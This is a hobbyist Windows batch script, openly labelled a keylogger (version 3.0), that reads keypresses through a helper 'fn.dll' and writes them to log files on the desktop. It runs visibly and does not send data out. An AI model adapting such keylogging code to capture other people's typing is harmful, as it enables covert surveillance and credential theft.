@echo off
cls
CD Files
mode 85,25
:: This keylogger is able to log all keys pressed...[A-Z and a-z and 0-9]
:: and it can almost log all Characters on your Keyboard...including all special keys ...as to Remove limitation of Previous Versions of this program ...
:: #kvc

REM As in ver. 1.0 ,we used 'choice.exe or choice.com' for logging Pressed keys on Keyboard ...
rem and we've used 'mChoice.exe' (written in C) for ver.2.0
REM same reason for using 'fn.dll' file in this version...i.e. to fulfill our requirment !!


:: for any info. contact me 'karanveerchouhan@gmail.com' or 'karanveerchouhan.kvc@facebook.com'
:: Or
:: you can Leave a comment on my blog too...
:: visit my Blog 'batchprogrammers.blogspot.in'


title Keylogger-Batch by kvc Ver. 3.0
setlocal enabledelayedexpansion
REm Checking if our fn.dll file is present or not ...
REM if not exist "fn.dll" (echo. The fn.dll file is not found ...&echo.Please make sure that Both Files are in the Same Folder as you Downloaded them !! && goto end)
set var=
if exist "%userprofile%\desktop\keylogger_original.txt" del /q "%userprofile%\desktop\keylogger_original.txt" >nul 2>&1
if exist "%userprofile%\desktop\keylogger_Modified.txt" del /q "%userprofile%\desktop\keylogger_Modified.txt" >nul 2>&1
:a
cls
if exist "%userprofile%\desktop\keylogger_Modified.txt" (set /p var1=<"%userprofile%\desktop\keylogger_Modified.txt") ELSE set var1=
set result=
echo. !var!
echo. !var1!
echo.
echo.				Keylogger by Kvc
echo.&echo.Check the log file of All possible pressed Keys in "Desktop\keylogger_original.txt"
echo.&echo.Check the log file of intentional pressed Keys in "Desktop\keylogger_Modified.txt"
echo.
fn.dll kbd
call :chk_keyPressed "%errorlevel%" Result
set var=!var!!result!
echo.!var!>"%userprofile%\desktop\keylogger_original.txt"
call :manuplate_it "%result%"
goto a

:manuplate_it
if exist "%userprofile%\desktop\keylogger_Modified.txt" (set /p var1=<"%userprofile%\desktop\keylogger_Modified.txt") ELSE set var1=
if /i "%~1" == "{BS}" (
call :getlen "!var1!" size
if "!size!" leq "1" (Del /q "%userprofile%\desktop\keylogger_Modified.txt"&&goto :eof)
ECHO.%var1:~0,-1%>"%userprofile%\desktop\keylogger_Modified.txt"
goto :eof
)
if /i "%~1" == "{TAB}" (ECHO.%var1%	>"%userprofile%\desktop\keylogger_Modified.txt"&&goto :eof)
if /i "%~1" == "{Enter}" (ECHO.>>"%userprofile%\desktop\keylogger_Modified.txt"&&goto :eof)
if /i "%~1" == "{Space}" (ECHO.%var1% >"%userprofile%\desktop\keylogger_Modified.txt"&&goto :eof)
set "temp=%~1"
if /i "!temp:~0,1!" == "{" (goto :eof)
set var1=!var1!%temp%
echo.%var1%>"%userprofile%\desktop\keylogger_Modified.txt"
goto :eof

:chk_keyPressed
REM Checking if any Special key is Pressed or Not ...
if /i "%~1" == "0" set "%~2={NULL}"
if /i "%~1" == "1" set "%~2={Alt+1}"
if /i "%~1" == "2" set "%~2={Alt+2}"
if /i "%~1" == "3" set "%~2={Alt+3}"
if /i "%~1" == "4" set "%~2={Alt+4}"
if /i "%~1" == "5" set "%~2={Alt+5}"
if /i "%~1" == "6" set "%~2={Alt+6}"
if /i "%~1" == "7" set "%~2={Alt+7}"
if /i "%~1" == "8" set "%~2={BS}"
if /i "%~1" == "9" set "%~2={TAB}"
if /i "%~1" == "10" set "%~2={Enter}"
if /i "%~1" == "11" set "%~2={VerticalTab}"
if /i "%~1" == "12" set "%~2={FormFeed}"
if /i "%~1" == "13" set "%~2={Enter}"
if /i "%~1" == "14" set "%~2={ShiftIn [alt+14]}"
if /i "%~1" == "15" set "%~2={Shiftout [alt+15]}"
if /i "%~1" == "16" set "%~2={DataLinkEscape [alt+16]}"
if /i "%~1" == "17" set "%~2={DeviceControl1 [alt+17]}"
if /i "%~1" == "18" set "%~2={DeviceControl2 [alt+18]}"
if /i "%~1" == "19" set "%~2={DeviceControl3 [alt+19]}"
if /i "%~1" == "20" set "%~2={DeviceControl4} [alt+20]"
if /i "%~1" == "21" set "%~2={Negative_acknowledgement [alt+21]}"
if /i "%~1" == "22" set "%~2={Alt+22}"
if /i "%~1" == "23" set "%~2={Alt+23}"
if /i "%~1" == "24" set "%~2={Cancel [alt+24]}"
if /i "%~1" == "25" set "%~2={Alt+25}"
if /i "%~1" == "26" set "%~2={Alt+26}"
if /i "%~1" == "27" set "%~2={Escape}"
if /i "%~1" == "28" set "%~2={Alt+28}"
if /i "%~1" == "29" set "%~2={Alt+29}"
if /i "%~1" == "30" set "%~2={Alt+30}"
if /i "%~1" == "31" set "%~2={Alt+31}"
if /i "%~1" == "32" set "%~2={Space}"
if /i "%~1" == "33" set "%~2=^!"
if /i "%~1" == "34" set "%~2=""
if /i "%~1" == "35" set "%~2=#"
if /i "%~1" == "36" set "%~2=$"
if /i "%~1" == "37" set "%~2=^%"
if /i "%~1" == "38" set "%~2=^&"
if /i "%~1" == "39" set "%~2='"
if /i "%~1" == "40" set "%~2=^("
if /i "%~1" == "41" set "%~2=^)"
if /i "%~1" == "42" set "%~2=*"
if /i "%~1" == "43" set "%~2=+"
if /i "%~1" == "44" set "%~2=,"
if /i "%~1" == "45" set "%~2=-"
if /i "%~1" == "46" set "%~2=."
if /i "%~1" == "47" set "%~2=/"
for /l %%a in (0,1,9) do ((set /a z=%%a+48) && if /i "%~1" == "!z!" set "%~2=%%a")
if /i "%~1" == "58" set "%~2=:"
if /i "%~1" == "59" set "%~2=;"
if /i "%~1" == "60" set "%~2=^<"
if /i "%~1" == "61" set "%~2=="
if /i "%~1" == "62" set "%~2=^>"
if /i "%~1" == "63" set "%~2=?"
if /i "%~1" == "64" set "%~2=@"
SET COUNT=64
FOR %%A IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO ((SET /A COUNT=!COUNT!+1)&&(IF /I "%~1" == "!COUNT!" SET "%~2=%%A"))
if /i "%~1" == "91" set "%~2=["
if /i "%~1" == "92" set "%~2=\"
if /i "%~1" == "93" set "%~2=]"
if /i "%~1" == "94" set "%~2=^"
if /i "%~1" == "95" set "%~2=_"
if /i "%~1" == "96" set "%~2=`"
SET COUNT=96
FOR %%A IN (a b c d e f g h i j k l m n o p q r s t u v w x y z) DO ((SET /A COUNT=!COUNT!+1)&&(IF /I "%~1" == "!COUNT!" SET "%~2=%%A"))
if /i "%~1" == "123" set "%~2={"
if /i "%~1" == "124" set "%~2=|"
if /i "%~1" == "125" set "%~2=}"
if /i "%~1" == "126" set "%~2=~"
if /i "%~1" == "127" set "%~2={DEL}"
for /l %%a in (128,1,254) do (if /i "%~1" == "%%a" set "%~2={Alt+%%a}")
if /i "%~1" == "327" set "%~2={UP}"
if /i "%~1" == "335" set "%~2={Down}"
if /i "%~1" == "330" set "%~2={left}"
if /i "%~1" == "332" set "%~2={right}"
if /i "%~1" == "314" set "%~2={F1}"
if /i "%~1" == "315" set "%~2={F2}"
if /i "%~1" == "316" set "%~2={F3}"
if /i "%~1" == "317" set "%~2={F4}"
if /i "%~1" == "318" set "%~2={F5}"
if /i "%~1" == "319" set "%~2={F6}"
if /i "%~1" == "320" set "%~2={F7}"
if /i "%~1" == "321" set "%~2={F8}"
if /i "%~1" == "322" set "%~2={F9}"
if /i "%~1" == "323" set "%~2={F10}"
if /i "%~1" == "388" set "%~2={F11}"
if /i "%~1" == "389" set "%~2={F12}"
if /i "%~1" == "337" set "%~2={Insert}"
if /i "%~1" == "338" set "%~2={DEL}"
goto :eof

:getlen
set "all=%~1"
set all=%all:(=.%
set all=%all:)=.%
set len=0
goto loop
:loop
if "%all%" neq "" (
set all=%all:~1%
set /a len=%len%+1
goto loop
)
set %2=%len%
goto :eof

:end
pause
exit /b 
